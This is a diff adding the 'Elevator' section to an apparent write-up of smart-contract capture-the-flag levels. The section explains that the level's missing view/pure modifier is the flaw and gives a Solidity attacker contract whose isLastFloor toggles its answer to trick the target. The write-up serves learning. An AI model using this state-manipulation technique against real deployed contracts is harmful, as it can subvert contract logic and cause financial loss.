@@ -136,5 +136,22 @@ contract Attack {
     }
 }
 ```
+## 11. Elevator
+We are tasked with getting to the top floor of the building we are in, at first looking at the contract it seems it was designed to never let us reach it though. The exploit in it though is that they do not assign it a view or pure identifier which would let this be true. Since they left that out we can create a new contract with the same name ```Building``` and implement our own ```isLastFloor()``` function that lets us make the ```await contract.top()``` in the browser console become true.
+```
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.6.0;
+contract Building {
+    Elevator public target = Elevator(Instance ID);
+    bool public _switch = false;
 
+    function gotoFloor() public {
+        target.goTo(1);
+    }
 
+    function isLastFloor(uint) public returns (bool) {
+        _switch = !_switch;
+        return !_switch;
+    }
+}
+```
